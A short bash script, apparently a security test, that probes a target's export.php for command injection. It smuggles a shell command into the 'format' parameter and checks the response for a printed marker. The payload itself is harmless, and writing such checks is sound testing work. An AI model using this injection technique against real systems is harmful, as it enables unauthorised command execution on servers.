#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
curl -s -G --data-urlencode "format=csv'; printf PHP_CMD_42; #" "$TARGET/export.php" | grep -q 'PHP_CMD_42'
